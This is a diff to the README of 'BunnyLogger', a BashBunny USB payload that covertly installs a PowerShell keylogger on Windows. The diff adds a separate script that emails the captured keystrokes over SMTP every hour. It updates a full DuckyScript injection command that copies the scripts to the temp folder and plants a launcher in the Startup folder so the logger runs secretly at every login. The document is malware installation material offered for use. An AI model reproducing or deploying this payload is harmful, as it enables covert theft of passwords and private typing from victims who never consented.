@@ -17,7 +17,9 @@ BunnyLogger is a BashBunny payload that uses PowerShell to log keystrokes
 ```
 - moves *c.cmd* file to windows startup directory
 - *c.cmd* will secretly run *p.ps1*
-- *p.ps1* will log keystrokes and email the logs every startup and every hour [via SMTP]
+- *p.ps1* will log keystrokes 
+- *l.ps1* will email the logs every startup and every hour [via SMTP]
+    - sends logs hourly, regardless of system time
 
 ## Resources:
 - [YouTube Video]()
@@ -41,7 +43,7 @@ $password = "password"
 2. in line 7 of *duckyscript.txt*, change 'switch1' to whatever switch you use
 3. in line 7 of *duckyscript.txt*, change 'BashBunny' to the name of your BashBunny
 ```powershell
-STRING $u=gwmi Win32_Volume|?{$_.Label -eq'BashBunny'}|select name;cd $u.name;cp .\payloads\switch1\p.ps1 $env:temp;cp .\payloads\switch1\c.cmd "C:/Users/$env:UserName/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup";cd $env:temp;echo "">"$env:UserName.log";
+STRING $u=gwmi Win32_Volume|?{$_.Label -eq'BashBunny'}|select name;cd $u.name;cp .\payloads\switch1\p.ps1 $env:temp;cp .\payloads\switch1\l.ps1 $env:temp;cp .\payloads\switch1\c.cmd "C:/Users/$env:UserName/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup";cd $env:temp;echo "">"$env:UserName.log";
 ```
 ## Extraneous:
 The *c.cmd* attack opportunity
